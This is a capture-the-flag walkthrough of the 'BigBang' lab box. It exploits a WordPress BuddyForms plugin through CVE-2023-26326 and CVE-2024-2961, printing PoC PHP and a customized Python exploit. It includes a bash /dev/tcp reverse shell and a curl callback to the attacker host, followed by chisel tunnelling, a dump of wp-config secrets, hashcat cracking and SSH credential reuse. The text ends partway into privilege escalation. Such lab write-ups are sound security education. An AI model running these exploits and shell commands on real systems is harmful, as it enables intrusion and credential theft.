ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v Only the result we already knew about. It would be foolish to neglect to check for subdomains of that subdomain, though:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.blog.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-blog-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results. I&rsquo;ll move on to directory enumeration next:
Directory enum First, I&rsquo;ll check bigbang.htb:
I prefer to not run a recursive scan, so that it doesn&rsquo;t get hung up on enumerating CSS and images.
# composition of several wordlists from SecLists WLIST=/usr/share/wordlists/dirs-and-files.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 60 -ic -c -o fuzzing/ffuf-directories-root -of json -timeout 4 -fw 20 Nothing. now I&rsquo;ll check the wordpress subdomain, blog.bigbang.htb:
ffuf -w $WLIST:FUZZ -u http://blog.$DOMAIN/FUZZ -t 60 -ic -c -o fuzzing/ffuf-directories-blog -of json -timeout 4 -e &#39;,.php,.txt,.bak,.html,.xml&#39; -mc all -fc 404 That&rsquo;s a lot! But then again, I guess Wordpress isn&rsquo;t exactly known for being lightweight &#x1f605;
Exploring the Website The website looks like a landing page for a physics university. That&rsquo;s right, a university that on only does physics.
Wappalyzer analyzed a bunch of the included scripts and stylesheets to determine that we&rsquo;re looking at Wordpress version 6.5.4
The bottom of the page has a TinyMCE editor that allows us to submit a &ldquo;Review&rdquo;. I tried one, and found that it submitted fine. The result was alongside the test Review done by root, shown here at http://blog.bigbang.htb/?cat=1:
Wordpress Strategy Theme scraping curl -s -X GET http://blog.bigbang.htb | sed &#39;s/href=/\\n/g&#39; | sed &#39;s/src=/\\n/g&#39; | grep &#39;themes&#39; | cut -d&#34;&#39;&#34; -f2 This shows that the target is currently running the TwentyTwentyFour theme, which was the default theme for Wordpress during 2024.
Wordpress issues a theme like this every year. You can consider it the &ldquo;basic&rdquo; theme. It makes a great starting point for building your own theme, or fully-custom website in Wordpress. It also receives the most testing of any theme, so I doubt we&rsquo;ll find any security holes in it.
Plugin scraping curl -s -X GET http://blog.bigbang.htb | sed &#39;s/href=/\\n/g&#39; | sed &#39;s/src=/\\n/g&#39; | grep &#39;wp-content/plugins/*&#39; | cut -d&#34;&#39;&#34; -f2 We can see that there are a bunch of links referencing the buddyforms plugin.
Buddyforms has had a few vulnerabilities disclosed over the last few years. One really notable one I found was regarding a failure to validate the image URL in the upload_image_from_url function. This can lead to all sorts of fun things, including PHAR deserialization. This vulnerability was patched at version 2.7.8, but we don&rsquo;t actually know what version our target is running&hellip; I will definitely check this out soon &#x1f6a9;
WPScan WPScan is installed by default in Kali, and has a ton of excellent recon features. Let&rsquo;s try it out:
wpscan --url blog.$DOMAIN It uncovered a LOT of info:
[+] Headers | Interesting Entries: | - Server: Apache/2.4.62 (Debian) | - X-Powered-By: PHP/8.3.2 | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://blog.bigbang.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://blog.bigbang.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://blog.bigbang.htb/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://blog.bigbang.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05). | Found By: Rss Generator (Passive Detection) | - http://blog.bigbang.htb/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=6.5.4&lt;/generator&gt; | - http://blog.bigbang.htb/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=6.5.4&lt;/generator&gt; [+] WordPress theme in use: twentytwentyfour | Location: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/ | Last Updated: 2024-11-13T00:00:00.000Z | Readme: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/readme.txt | [!] The version is out of date, the latest version is 1.3 | [!] Directory listing is enabled | Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css | Style Name: Twenty Twenty-Four | Style URI: https://wordpress.org/themes/twentytwentyfour/ | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Urls In Homepage (Passive Detection) | | Version: 1.1 (80% confidence) | Found By: Style (Passive Detection) | - http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css, Match: &#39;Version: 1.1&#39; [+] Enumerating All Plugins (via Passive Methods) [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] buddyforms | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/ | Last Updated: 2024-09-25T04:52:00.000Z | [!] The version is out of date, the latest version is 2.8.13 | | Found By: Urls In Homepage (Passive Detection) | | Version: 2.7.7 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:04 &lt;=========================================================&gt; (137 / 137) 100.00% Time: 00:00:04 [i] No Config Backups Found. We already knew a few of those things, but this scan provided some valuable insight:
XML-RPC is enabled External wp-cron is enabled Directory listing is enabled on /uploads http://blog.bigbang.htb/wp-content/uploads/ There are a LOT of .png files in there, in addition to the one I uploaded via the &ldquo;Reviews&rdquo; form Directory listing is enabled for the theme, too http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/ Buddyforms is at version 2.7.7! It says only 80% confidence. However, if you check the readme that it links to, you&rsquo;ll see that 2.7.7 is the top item in the changelog. That means it&rsquo;s probably vulnerable to the insecure deserialization CVE I found earlier, CVE-2023-26326! FOOTHOLD PHAR Deserialization &#x1f6ab; This didn&rsquo;t lead anywhere, but&hellip;
I end up re-using the second of the two requests that I showed below (the one that accesses a PHAR file by &ldquo;uploading&rdquo; to /wp-admin/admin-ajax.php).
If you&rsquo;re short on time, just read that part and skip to the next section.
The author of the CVE-2023-26326 disclosure makes exploitation of the BuddyForms bug sound really easy. However, they mention a couple times that they&rsquo;ve inserted a &ldquo;dummy&rdquo; helper class to ensure that their payload actually executes.
We definitely don&rsquo;t have such a &ldquo;dummy&rdquo; class on our target, so I&rsquo;m not expecting success on this&hellip; Regardless, there have been some really easy PHAR deserialization bugs in the past, so let&rsquo;s try out their methods and see what happens.
Their &ldquo;Dummy&rdquo; class (not shown here) contains a definition for the Evil class, which implements the __wakeup() method. This is one of the PHP &ldquo;magic&rdquo; methods that performs deserialization and can be used to achieve RCE; it&rsquo;s one of the methods that froms the basis of PHP POP chains.
The point is this: since our target does not have Evil declared when evil.phar would be deserialized, there is zero chance that this will work. Make sense?
I copied the author&rsquo;s PHP for generating a PoC phar file:
&lt;?php class Evil{ function revshell() : void { echo &#34;hello world&#34;; phpinfo(); } public function __wakeup() : void { revshell(); die(&#34;Arbitrary Deserialization&#34;); } } //create new Phar $phar = new Phar(&#39;evil.phar&#39;); $phar-&gt;startBuffering(); $phar-&gt;addFromString(&#39;test.txt&#39;, &#39;text&#39;); $phar-&gt;setStub(&#34;GIF89a\\n&lt;?php __HALT_COMPILER(); ?&gt;&#34;); // add object of any class as meta data $object = new Evil(); $phar-&gt;setMetadata($object); $phar-&gt;stopBuffering(); To run the script and generate the .phar file, we must set phar.readonly to false:
php --define phar.readonly=0 phar_deserialization_1.php I&rsquo;ve already observed that the Review feature on the front page of our target interacts with /wp-admin/admin-ajax.php and uses BuddyForms (vulnerable version), so that&rsquo;s where we&rsquo;ll submit this payload.
BuddyForms has a filetype filter, but we can bypass this easily be interacting with the /wp-admin/admin-ajax.php endpoint directly, circumventing the form entirely.
We can verify that the upload succeeded by checking the uploads directory: http://blog.bigbang.htb/wp-content/uploads/2025/01/. The file gets renamed to 1.png automatically.
The second part is perform that same request, but upload the file to the server using the phar:// wrapper. We must use the same id parameter:
Since we need to use the phar:// wrapper, the URL must now point to a file, instead of an HTTP address. Therefore, we will use the relative path to the uploads directory instead.
This might work, but to get RCE I would have to find a gadget chain that actually exists in the application. For now though, this might be useful an file read?
Arbitrary File Read While searching for ways to leverage BuddyForms into a file read, I came across another, much larger, article by Ambionics. They reference the BuddyForms-related CVE and show how they were able to turn CVE-2023-26326 into RCE &#x1f62e;
It looks like they listed their findings as CVE-2024-2961. They also mention using another tool by Ambionics called wrapwrap. Wrapwrap determines the PHP filter chain (as shown in the CVE-2024-2961 article) that can be used to encapsulate data - adding both a prefix and a suffix to the data. Perfect for if we want to trick the server into interpreting a file as an &ldquo;alternative&rdquo; file type!
mkdir ./python-env &amp;&amp; cd python-env python3 -m venv . &amp;&amp; source bin/activate https://github.com/ambionics/wrapwrap.git pip3 install ten # there&#39;s no requirements.txt file for this repo, so install manually python3 wrapwrap.py /etc/passwd &#39;GIF89a\\n&#39; &#39;&#39; 100 This should make a PHP filter chain to read /etc/passwd, prefixing it with a GIF header. The filter chain is in ./chain.txt and appears to have worked perfectly.
Using this filter chain, we should be able to re-use the idea from the CVE-2023-26326 blog post, combining it with CVE-2024-2961, to perform an arbitrary file read.
It took a little while, but I put together a nice script to tackle everything: https://github.com/4wayhandshake/CVE-2024-2961. I also included a handy feature that allows us to download files from this same prompt.
The prefix length is 9 because of GIF89a\\n (and the slash counts as two chars, due to python&rsquo;s character escaping)
Wordpress Admin Panel As shown during directory enumeration, we can freely access the login at /wp-admin. We don&rsquo;t have any valid credentials, but we&rsquo;re reasonably certain (based on existing Reviews on the blog) that root is a username.
As saw earlier, we could probably transform some PHAR deserialization into RCE if we only had a vulnerable class already loaded into memory - one that implements at least one of the PHP POP chain &ldquo;magic functions&rdquo;.
So, if we can login to /wp-admin, couldn&rsquo;t we just load a malicious plugin into the website that has a vulnerable Class in it?
Or even better, could we just install a plugin that provides us a webshell directly?
Getting valid credentials to the admin panel would open us up to a whole new set of possibilities for foothold.
But since this is standard Wordpress, and we have an LFI that can access anything the webserver can reach, why not just check to see if we can get a password?
The main Worpress config file is wp-config.php:
Theres a whole bunch of secrets in this file:
define( &#39;AUTH_KEY&#39;, &#39;(6xl?]9=.f9(&lt;(yxpm9]5&lt;wKsyEc+y&amp;MV6CjjI(0lR2)_6SWDnzO:[g98nOOPaeK&#39; ); define( &#39;SECURE_AUTH_KEY&#39;, &#39;F&lt;3&gt;KtCm^zs]Mxm Rr*N:&amp;{SWQexFn@ wnQ+bTN5UCF-&lt;gMsT[mH$m))T&gt;BqL}%8&#39; ); define( &#39;LOGGED_IN_KEY&#39;, &#39;:{yhPsf}tZRfMAut2$Fcne/.@Vs&gt;uukS&amp;JB04 Yy3{\`$\`6p/Q=d^9=ZpkfP,o%l]&#39; ); define( &#39;NONCE_KEY&#39;, &#39;sC(jyKu&gt;gY(,&amp;: KS#Jh7x?/CB.hy8!_QcJhPGf@3q&lt;-a,D#?!b}h8 ao;g[&lt;OW;&#39; ); define( &#39;AUTH_SALT&#39;, &#39;_B&amp; tL]9I?ddS! 0^_,4M)B&gt;aHOl{}e2P(l3=!./]~v#U&gt;dtF7zR=~LnJtLgh&amp;KK&#39; ); define( &#39;SECURE_AUTH_SALT&#39;, &#39;&lt;Cqw6ztRM/y?eGvMzY(~d?:#]v)em\`.H!SWbk.7Fj%b@Te&lt;r^^Vh3KQ~B2c|~VvZ&#39; ); define( &#39;LOGGED_IN_SALT&#39;, &#39;_zl+LT[GqIV{*Hpv&gt;]H:&lt;U5oO[w:]?%Dh(s&amp;Tb-2k\`1!WFqKu;elq7t^~v7zS{n[&#39; ); define( &#39;NONCE_SALT&#39;, &#39;t2~PvIO1qeCEa^+J}@h&amp;x&lt;%u~Ml{=0Orqe]l+DD7S}%KP}yi(6v$mHm4cjsK,vCZ&#39; ); But, unless I&rsquo;m mistaken, we can&rsquo;t actually use these without some kind of XSS &#x1f914;
There&rsquo;s a good chance a smarter person would know how to utilize this info, but I don&rsquo;t! &#x1f613;
Ambionics CVE-2024-2961 Exploit Planning We saw earlier from the video at the bottom of the Ambionics article that the author was able to leverage CVE-2024-2961 into full RCE:
https://www.ambionics.io/images/iconv-cve-2024-2961-p1/demo.mp4
How is that possible? Well, in short, they used long Iconv PHP filter chain that overflows data to ultimately cause an out-of-bounds access to libc and execute OS shell commands:
LFI /proc/self/maps from the target, to find the location of the PHP heap and within it, the location of the reference to libc LFI libc to locate the reference to system() Perform a miraculous heap overflow (as described in the article) that injects a command into system(), thus gaining RCE If I&rsquo;m following correctly, we should be able to customize their cnext-exploit.py script to replicate their work.
Reading the exploit Thankfully, the script is really well-commented and leaves instructions for how we might customize it for our target.
Basically, we need to write a custom implementation of Remote. That&rsquo;s really simple, since Remote does almost exactly the same job as my LFI script! I was able to copy-paste a lot of it from the work I had already done.
We implement the Remote class so that it follows the same method as our LFI:
Use the same upload to /wp-admin/admin-ajax.php as before, tricking the server into thinking we&rsquo;re uploading a GIF by using a PHP filter chain. ** The filter chain may or may not also perform some kind of data exfiltration.* Successful upload returns a URL of the &ldquo;uploaded&rdquo; file, we then access that file via a GET request to see our exfil&rsquo;d data. We just need to separate the download() &ndash;&gt; send() flow into the two distinct steps described above.
After the definition of Remote, the exploit does a few things:
Tests whether or not we have access to the PHP wrappers: data, filter, and zlib.inflate Gets a copy of /self/proc/maps Gets a copy of whatever reference to libc it finds in /self/proc/maps Performs the heap overflow, sneaking a payload into system() Implementing Remote This is roughly where I landed for my first draft of Remote:
I&rsquo;ve trimmed out filter_chain and headers for brevity. filter_chain is just what I got from wrapwrap (same as I used for the LFI) and headers are a copy-paste from my original interactions with blog.bigbang.htb via ZAP &#x1f447;
class Remote: &#34;&#34;&#34;A helper class to send the payload and download files. The logic of the exploit is always the same, but the exploit needs to know how to download files (/proc/self/maps and libc) and how to send the payload. The code here serves as an example that attacks a page that looks like: \`\`\`php &lt;?php $data = file_get_contents($_POST[&#39;file&#39;]); echo &#34;File contents: $data&#34;; Tweak it to fit your target, and start the exploit. &quot;&quot;&quot; filter_chain = 'convert.base64-encode|convert.iconv.855.UTF7|...|convert.base64-decode' headers = { &quot;host&quot;: &quot;blog.bigbang.htb&quot;, #... &quot;Sec-GPC&quot;: &quot;1&quot; } def __init__(self, url: str) -&gt; None: self.url = url self.session = Session() def send(self, path: str) -&gt; Response: &quot;&quot;&quot;Sends given \`path\` to the HTTP server. Returns the response. &quot;&quot;&quot; return self.session.get(path, proxies=proxies) def download(self, path: str) -&gt; bytes: &quot;&quot;&quot;Returns the contents of a remote file. &quot;&quot;&quot; uploaded_path = self.upload_resource(path) if uploaded_path is None: return response = self.send(uploaded_path) # Remove the GIF prefix t = response.text[9:] return t.encode() def upload_resource(self, path: str) -&gt; None: url = f'http://blog.bigbang.htb/wp-admin/admin-ajax.php' _url = f'php://filter/{self.filter_chain}/resource={path}' data = { &quot;action&quot;: &quot;upload_image_from_url&quot;, &quot;url&quot;: _url, &quot;id&quot;: 42, &quot;accepted_files&quot;: &quot;image/gif&quot; } resp = self.session.post(url, headers=self.headers, data=data, timeout=3, proxies=proxies) if 200 &lt;= resp.status_code &lt;= 299: resp_data = resp.json() if ('status' in resp_data) and ('response' in resp_data) and resp_data.get('status') == 'OK': return resp_data.get('response') return None return None With \`Remote\` in this state, a call to \`Remote::download()\` pretty much replicates what my LFI script did before. #### Pre-exploit tests It didn&#39;t take long to realize that the \`Remote\` class in this state caused all of the pre-exploit tests to fail. &gt; ##### Out-of-band testing &gt; &gt; The end goal of this exploit is to gain RCE. To verify whether or not it&#39;s working, I&#39;ll be issuing a simple \`curl\` command so that it contacts my (attacker-controlled) HTTP server; i.e. I&#39;ll try to inject this: &gt; &gt; \`\`\`bash &gt; curl &#34;http://10.10.14.14:8000?msg=cnext&#34; &gt; \`\`\` &gt; &gt; To listen for this, I&#39;ll start up an [HTTP server](https://github.com/4wayhandshake/simple-http-server): &gt; &gt; \`\`\`bash &gt; sudo ufw allow from $RADDR to any port 8000 &gt; simple-server 8000 -v &gt; \`\`\` Why did the pre-exploit tests fail? Simple: those tests include their own filter chains and \`/resource=\` parts, so I had to adjust the code to accomodate that. I added an extra arg called \`has_own_wrapper\` and changed the behaviour of \`upload_resource\` to trim out the provided PHP wrappers and \`resource\`, and insert them into the proper spots within the actual POST request: \`\`\`python def upload_resource(self, path: str, has_own_wrapper) -&gt; None: url = f&#39;http://blog.bigbang.htb/wp-admin/admin-ajax.php&#39; if not has_own_wrapper: _url = f&#39;php://filter/{self.filter_chain}/resource={path}&#39; else: # How can I merge the GIF filter chain with the one provided in path? i = path.find(&#39;/resource=&#39;) ii = len(&#39;/resource=&#39;) if i &lt; 0: raise ValueError(&#39;the &#34;/resource=&#34; substring was expected, but not provided:\\n{path}&#39;) resource = path[i+ii:] j = path.find(&#39;php://filter/&#39;) jj = len(&#39;php://filter/&#39;) filt = self.filter_chain if j &gt;= 0 and (abs(i-(j+jj))&gt;0): # Append the provided filter chain to the GIF filter chain? filt = self.filter_chain + &#39;|&#39; + path[j+jj:i] _url = f&#39;php://filter/{filt}/resource={resource}&#39; data = { &#34;action&#34;: &#34;upload_image_from_url&#34;, &#34;url&#34;: urllib.parse.quote_plus(_url), &#34;id&#34;: 42, &#34;accepted_files&#34;: &#34;image/gif&#34; } resp = self.session.post(url, headers=self.headers, data=data, timeout=10, proxies=proxies) if 200 &lt;= resp.status_code &lt;= 299: resp_data = resp.json() if (&#39;status&#39; in resp_data) and (&#39;response&#39; in resp_data) and resp_data.get(&#39;status&#39;) == &#39;OK&#39;: return resp_data.get(&#39;response&#39;) return None return None Yep! That actually works surprisingly well &#x1f44d;
However, this code still causes the zlib.inflate test to fail. Ultimately, I realized that zlib.inflate was only required for the final payload, so I didn&rsquo;t actually need to fix this behaviour by changing Remote (more on that later)
Bypassing the tests For now, we can just bypass the pre-exploit check for zlib.inflate:
# ... text = tf.random.string(50) base64 = b64(compress(text.encode()), misalign=True).decode() path = f&#34;php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}&#34; if False and not check_token(text, path): #if not check_token(text, path): failure(&#34;The [i]zlib[/] extension is not enabled&#34;) msg_info(&#34;The [i]zlib[/] extension is enabled&#34;) msg_success(&#34;Exploit preconditions are satisfied&#34;) # ... Recall steps 1-4 that I outlined in the &ldquo;reading the exploit&rdquo; section - The code in this state actually gets us all the way to step 3!
That&rsquo;s pretty good progress.
Step 3: Get a copy of libc Even after all kinds if creative workarounds in the code, I could NOT get past part where the exploit reads libc and tries to find the reference to system() &#x1f61e;
&#x1f914; But maybe we don&rsquo;t need to fix the code? Maybe we can just bypass this too? After all, the exploit is simply utilizing the LFI to download libc and save it to /dev/shm/cnext-libc, where it access the file from that location:
def get_symbols_and_addresses(self) -&gt; None: &#34;&#34;&#34;Obtains useful symbols and addresses from the file read primitive.&#34;&#34;&#34; regions = self.get_regions() LIBC_FILE = &#34;/dev/shm/cnext-libc&#34; # PHP&#39;s heap self.info[&#34;heap&#34;] = self.heap or self.find_main_heap(regions) # Libc libc = self._get_region(regions, &#34;libc-&#34;, &#34;libc.so&#34;) self.download_file(libc.path, LIBC_FILE) # &lt;--- Use the LFI and save to /dev/shm/cnext-libc self.info[&#34;libc&#34;] = ELF(LIBC_FILE, checksec=False) self.info[&#34;libc&#34;].address = libc.start We already have a reliable LFI (my other script), so why not just check /proc/self/maps and see what libc it&rsquo;s trying to access?
Cool, so it&rsquo;s going to try to get /usr/lib/x86_64-linux-gnu/libc.so.6 from the target and read it. Seems simple, so why is that part failing? To investigate, I downloaded a copy of that file using my LFI script, and checked it out:
readelf -h libc.so.6 The target&rsquo;s copy of libc.so.6 is corrupted! Quite badly, too. Maybe we can download the correct one and just bypass that whole portion of the exploit? First, we&rsquo;ll need to know exactly which version of libc.so.6 we&rsquo;re looking at:
cat libc.so.6 | grep -a version That means that the exact version we want should have the filename libc6_2.36-9+deb12u4. We can find it with a quick search:
Is this a legitimate version of libc? Who&rsquo;s to say! &#x1f3b2;
Checking this result, we can find a download for the libc binary partway down the page:
It comes bundled as a .deb file, so we&rsquo;ll need to extract it:
mkdir libc dpkg-deb -x &#39;libc6_2.36.9+deb12u4_amd64.deb&#39; ./libc This unpacks a whole directory structure, but we can cherry-pick the exact file we need:
cp libc/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6 Now we can modify the exploit to reference this file, instead of getting the corrupt one from the target:
# ... def get_symbols_and_addresses(self) -&gt; None: &#34;&#34;&#34;Obtains useful symbols and addresses from the file read primitive.&#34;&#34;&#34; regions = self.get_regions() #LIBC_FILE = &#34;/dev/shm/cnext-libc&#34; &lt;-- REPLACED LIBC_FILE = &#34;/home/kali/Box_Notes/BigBang/libc.so.6&#34; self.info[&#34;heap&#34;] = self.heap or self.find_main_heap(regions) libc = self._get_region(regions, &#34;libc-&#34;, &#34;libc.so&#34;) #self.download_file(libc.path, LIBC_FILE) &lt;-- REMOVED self.info[&#34;libc&#34;] = ELF(LIBC_FILE, checksec=False) self.info[&#34;libc&#34;].address = libc.start # ... Let&rsquo;s try running the script again, now that we&rsquo;re substituting in an alternate (hopefully not corrupt) version of libc.so.6:
python3 cnext-exploit-customized.py &#39;http://blog.bigbang.htb&#39; &#39;curl http://10.10.14.14:8000?msg=cnext&#39; We ran into an error again:
And it&rsquo;s failing right before the payload is delivered (hey, that&rsquo;s good progress!):
def exploit(self) -&gt; None: path = self.build_exploit_path() start = time.time() try: self.remote.send(path) # &lt;---- Failing at this line of Exploit except (ConnectionError, ChunkedEncodingError): pass I think I know why, though. It&rsquo;s because I accidentally let the exploit double-up on the PHP filter chain. To avoid the usual behavour of my Remote::upload_resource() function (which wraps the provided path with a filter chain to disguise as GIF), I&rsquo;ll write a new method for Remote that sends the payload without any disguise - I&rsquo;ll let this last part of the exploit be sent exactly as the exploit author wrote it:
Theoretically, we don&rsquo;t need to disguise the final payload as a GIF, because by the time the server parses the Iconv filter chain, it&rsquo;ll be too late: the payload will have already deployed.
&#x261d;&#xfe0f; We don&rsquo;t need the GIF disguise because we don&rsquo;t need to actually download any response from the server.
Using the send_raw() method, we can submit the payload as-is, while still conforming to our usual &ldquo;upload-then-read&rdquo; methodology (like we used with the initial LFI):
class Remote: # ... def send_raw(self, path: str) -&gt; Response: url = f&#39;http://blog.bigbang.htb/wp-admin/admin-ajax.php&#39; data = { &#34;action&#34;: &#34;upload_image_from_url&#34;, &#34;url&#34;: urllib.parse.quote_plus(path), &#34;id&#34;: 43, &#34;accepted_files&#34;: &#34;image/gif&#34; } resp = self.session.post(url, headers=self.headers, data=data, timeout=3, proxies=proxies) resp_url = None if 200 &lt;= resp.status_code &lt;= 299: resp_data = resp.json() if (&#39;status&#39; in resp_data) and (&#39;response&#39; in resp_data) and resp_data.get(&#39;status&#39;) == &#39;OK&#39;: resp_url = resp_data.get(&#39;response&#39;) if not resp_url: print(f&#39;The response failed to return a URL:\\n{json.dumps(resp.json())}&#39;) return return self.session.get(resp_url, proxies=proxies) # ... class Exploit: # ... def exploit(self) -&gt; None: path = self.build_exploit_path() start = time.time() try: #self.remote.send(path) # &lt;---- REPLACED self.remote.send_raw(path) except (ConnectionError, ChunkedEncodingError): pass # ... After this most recent modification, we get a new error - the error we&rsquo;d expect if the server rejects the file upload due to improper file type:
python3 cnext-exploit-customized.py &#39;http://blog.bigbang.htb&#39; &#39;curl http://10.10.14.14:8000?msg=cnext&#39; That&rsquo;s no surprise, though. Since I didn&rsquo;t include our &ldquo;pretend it&rsquo;s a GIF&rdquo; PHP filter chain in the send_raw() method, this makes perfect sense.
But then I noticed something that nearly knocked me out of my chair:
YES!
YEEEESSSS!
Regardless of the error, we just got RCE!
Reverse shell If I&rsquo;m going to leverage RCE into a reverse shell, I&rsquo;ll need to set up a reverse shell listener:
sudo ufw allow from $RADDR to any port 4444 bash nc -lvnp 4444 OK, let&rsquo;s run the exploit again, and see if we pop a shell:
python3 cnext-exploit-customized.py &#39;http://blog.bigbang.htb&#39; &#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.14/4444 0&gt;&amp;1&#34;&#39; Checking the reverse shell listener&hellip;
Jackpot! &#x1f4b0;
USER FLAG Local Enumeration - www-data The reverse shell opens into the wordpress directory. I was already mostly aware of the structure of Wordpress, and know which files to expect. Much earlier, using the LFI script, I had already obtained wp-config.php, which contained several secrets but also database credentials.
As a refresher, this is what we found for DB cconfiguration inside wp-config.php:
define( &#39;DB_NAME&#39;, &#39;wordpress&#39; ); define( &#39;DB_USER&#39;, &#39;wp_user&#39; ); define( &#39;DB_PASSWORD&#39;, &#39;wp_password&#39; ); define( &#39;DB_HOST&#39;, &#39;172.17.0.1&#39; ); However, when I went to check netstat to see if a database was listening, I realized we are in a fairly limited docker container&hellip; The essentials are present though, so we&rsquo;ll have to live off the land (and curl over what we need!)
Chisel SOCKS Proxy I&rsquo;ll serve a pre-built copy of chisel to www-data so that I can check out the database. I&rsquo;ll begin by opening a firewall port and starting the chisel server:
&#x261d;&#xfe0f; Note: I already have proxychains installed, and my /etc/proxychains.conf file ends with:
socks5 127.0.0.1 1080 sudo ufw allow from $RADDR to any port 9999 proto tcp ./chisel server --port 9999 --reverse Then, on the target machine, start up the chisel client and background it:
./chisel client 10.10.14.14:9999 R:1080:socks &amp; MySQL Now that the socks5 proxy is open, let&rsquo;s try connecting to the database:
proxychains mysql -h 172.17.0.1 -D wordpress -u wp_user -pwp_password Worked perfectly:
Let&rsquo;s check the wp_users table first:
Great! I copy-pasted the hashes and usernames into a file:
root:$P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1 shawking:$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./ &hellip; and proceeded to try to crack them:
WLIST=/usr/share/wordlists/rockyou.txt hashcat passwords.hash $WLIST --username I waited for hours and&hellip; nothing. &#x1f61e;
Finally got fed up and switched to a laptop with a hefty GPU and it managed to crack the password in under a second (and finished rockyou in 15s &#x1f644; shawking : quantumphysics
We&rsquo;re able to use this to log into /wp-admin, which is the purpose of the database, but there&rsquo;s nothing really in there:
Let&rsquo;s check for credential reuse on SSH&hellip;
&#x1f389; Alright! SSH drops us into /home/shawking, where the user flag is located. Go ahead and read it for the points:
cat user.txt ROOT FLAG Local enumeration - shawking There are two other low priv users on this box with a login shell:
root:x:0:0:root:/root:/bin/bash george:x:1000:1000:George Hubble:/home/george:/bin/bash shawking:x:1001:1001:Stephen Hawking,,,:/home/shawking:/bin/bash developer:x:1002:1002:,,,:/home/developer:/bin/bash shawking has no sudo privileges, so it&rsquo;s probable that I&rsquo;ll need to pivot to another user before we can find a path to the root flag.
We can get a preview of a bit of the docker setup on this box by checking ps aux:
There are several listening processes. Until now, we&rsquo;ve only seen a couple of these ports:
3306 will be the MySQL database we used earlier 80 would be HTTP, mapped to one of the other ports listening on the docker container Let&rsquo;s pop out of SSH and re-login, this time forwarding some ports:
ssh -L 41443:localhost:41443 -L 9090:localhost:9090 -L 3000:localhost:3000 shawking@$RADDR The first two ports appear to be using HTTP, but I&rsquo;ll need to enumerate them. Port 3000, however, is definitely Grafana (the visualization application):
Unfortunately, we don&rsquo;t have creds for it. And this application is running so slowly that I don&rsquo;t think I can do an online brute force (even a tiny one).
Thankfully though, I stumbled across some Grafana-related stuff while checking out /opt. I uploaded the DB for analysis on my attacker host:
Grafana DB Let&rsquo;s take a look inside:
Oh, that&rsquo;s annoying. Checking the file hashes, I realize that the upload did not work fully. I&rsquo;ll use SCP instead:
scp shawking@$RADDR:/opt/data/grafana.db ./grafana.db Great, now we can open up the database normally:
sqlite3 grafana.db sqlite&gt; .mode table sqlite&gt; .headers on sqlite&gt; select email, password, salt, rands, uid from user; I did a quick search about the hashing format for Grafana, and ended up finding a tool for converting these hashes into a usable format for hashcat. It requires the data in password,salt format, so I adjusted my sqlite query to suit:
.mode csv select password, salt from user; The output can be copied to clipboard directly
vim grafana-salted.hashes # paste from clipboard Now we can try using the tool
git clone https://github.com/iamaldi/grafana2hashcat.git python3 grafana2hashcat/grafana2hashcat.py -o grafana.hc10900 grafana-salted.hashes # Tool reports success :) Let&#39;s crack &#39;em! hashcat -m 10900 grafana.hc10900 /usr/share/wordlists/rockyou.txt Within a few seconds, one of the two passwords was cracked!
That&rsquo;s the second of the two hashes we provided, so we just got ghubble@bigbang.htb : bigbang &#x1f601;
Since this came from the Grafana DB, we&rsquo;re guaranteed a login there:
However, it looks like ghubble doesn&rsquo;t actually have any dashboards defined. To me, this is a strong indication that the box creator only included Grafana as a thing for holding password hashes&hellip; and that the true intention was credential re-use &#x1f914;
Credential reuse (again) There are still three accounts to test: ghubble, developer, and of course root. It&rsquo;s likely this password was for ghubble:
ssh ghubble@$RADDR # Nope ssh developer@$RADDR # Yep!! Local enumeration - developer It didn&rsquo;t take very long to figure out what makes developer different from the other users:
Note the name, satellite-app. Could this be related to what we saw earlier when checking ps aux? It was an elevated process:
/usr/bin/python3 /root/satellite/app.py It seems like a pretty likely P.E. clue, so I&rsquo;ll dive into this right away.
Satellite App - Decompilation First, I&rsquo;ll download a copy to my attacker host using SCP:
